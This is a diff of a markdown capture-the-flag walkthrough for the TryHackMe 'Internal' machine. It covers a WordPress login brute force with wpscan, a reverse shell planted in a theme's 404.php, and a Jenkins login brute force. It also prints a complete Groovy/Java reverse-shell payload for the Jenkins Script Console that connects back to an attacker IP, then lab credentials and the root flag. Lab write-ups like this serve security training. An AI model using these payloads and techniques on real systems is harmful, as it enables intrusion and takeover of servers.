@@ -1,27 +1,26 @@
 ---
 sticker: lucide//network
 ---
+# ENUMERATION
+---
 
-# INTERNAL
 
-## ENUMERATION
 
-***
+## OPEN PORTS
+---
 
-### OPEN PORTS
-
-***
 
 | PORT | SERVICE |
-| ---- | ------- |
+| :--- | :------ |
 | 22   | SSH     |
 | 80   | HTTP    |
 
-## RECONNAISSANCE
 
-***
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250529134856.png)
+# RECONNAISSANCE
+---
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529134856.png)
 
 We got a simple apache2 ubuntu page, source code is normal too, let's fuzz then:
 
@@ -56,7 +55,8 @@ phpmyadmin              [Status: 301, Size: 317, Words: 20, Lines: 10, Duration:
 
 Well we got some stuff, let's check it out:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250529135321.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529135321.png)
 
 We can see that on `/wordpress`, interesting part is the search bar, as we can see, there is something written that says:
 
@@ -66,11 +66,12 @@ It looks like nothing was found at this location. Maybe try a search?
 
 I tried `XSS` and `LFI` on here but none worked, so I tried searching for `wordpress` and this happened:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250529135808.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529135808.png)
 
 If we go to `your dashboard`, we get this url:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250529135828.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529135828.png)
 
 Seems like an internal resource, if we got `SSRF` we can maybe get access to that panel, but there's no need, since we know we are dealing with a `wordpress` site, best approach would be using `wpscan` to enumerate all possible attack vectors:
 
@@ -86,19 +87,20 @@ admin
 
 We find this also inside of the `hello world!` post inside of `/blog`:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250529140149.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529140149.png)
+
 
 Knowing this info, we can try brute forcing using `wpscan` too, there's a `wp-login.php` page we can find:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250529140506.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529140506.png)
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250529140518.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529140518.png)
 
 Let's proceed with exploitation.
 
-## EXPLOITATION
 
-***
+# EXPLOITATION
+---
 
 We need to brute force, let's use this command:
 
@@ -108,23 +110,26 @@ wpscan --url http://internal.thm/blog --usernames admin --passwords /usr/share/w
 
 It will take some time, after it finishes we get:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250529141114.png)
 
-We got credentials:
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529141114.png)
+
+
+We got credentials: 
 
 ```
 admin:my2boys
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250529141427.png)
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250529141513.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529141427.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529141513.png)
 
 As seen, we got access to the admin panel, on here, we can check this on the posts:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250529141550.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529141550.png)
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250529141610.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529141610.png)
 
 We got a reminder to reset `will's` credentials, we got:
 
@@ -134,11 +139,12 @@ william:arnold147
 
 I tried these at ssh but no luck, seems like we need to get a reverse shell through the themes as usual, let's do it:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250529141847.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529141847.png)
 
 On here, add a reverse shell:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250529141925.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529141925.png)
 
 Update the file and go to, we need to have our listener ready:
 
@@ -146,13 +152,13 @@ Update the file and go to, we need to have our listener ready:
 http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250529142034.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529142034.png)
 
 We got our reverse shell, let's begin privilege escalation.
 
-## PRIVILEGE ESCALATION
+# PRIVILEGE ESCALATION
+---
 
-***
 
 First step is to stabilize our shell:
 
@@ -166,11 +172,11 @@ export TERM=xterm
 export BASH=bash
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250529142155.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529142155.png)
 
 There we go, now we can look around, let's use `linpeas`:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250529142819.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529142819.png)
 
 Let's read it:
 
@@ -185,7 +191,8 @@ aubreanna:bubb13guM!@#123
 
 We got credentials for ssh:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250529142909.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529142909.png)
 
 We can now read `user.txt`:
 
@@ -250,21 +257,21 @@ We can now access it at:
 http://localhost:8888
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250529143436.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529143436.png)
 
 I tried same credentials as ssh but they didn't work, we need to bruteforce using either burp or caido, I will use caido because it's faster, capture the request and do:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250529143832.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529143832.png)
 
 We can see our request, let's send it to automate:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250529144006.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529144006.png)
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250529144538.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529144538.png)
 
 Run it and check:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250529144940.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529144940.png)
 
 Length on that one is different, credentials are:
 
@@ -272,15 +279,15 @@ Length on that one is different, credentials are:
 admin:spongebob
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250529145030.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529145030.png)
 
 Inside of `jenkins`, we can use `Script Console` to get ourselves a reverse shell as `jenkins`, let's do it:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250529145112.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529145112.png)
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250529145118.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529145118.png)
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250529145132.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529145132.png)
 
 As seen, this is being managed by groovy, we can guide ourselves on this medium post:
 
@@ -288,7 +295,7 @@ As seen, this is being managed by groovy, we can guide ourselves on this medium 
 https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250529145235.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529145235.png)
 
 ```java
 String host="OUR_IP";
@@ -297,9 +304,10 @@ String cmd="/bin/sh";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
 
+
 Once we run this on the console, we get a reverse shell:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250529145512.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529145512.png)
 
 Let's stabilize our shell once again:
 
@@ -315,7 +323,7 @@ export BASH=bash
 
 We can use `linpeas` again:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250529145945.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529145945.png)
 
 Once again, in `/opt` we got a note:
 
@@ -331,7 +339,7 @@ root:tr0ub13guM!@#123
 
 We got credentials for root, let's go into ssh session then:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250529150034.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529150034.png)
 
 We can now read root flag and finish the room:
 
@@ -340,4 +348,7 @@ root@internal:~# cat /root/root.txt
 THM{d0ck3r_d3str0y3r}
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250529150108.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529150108.png)
+
+
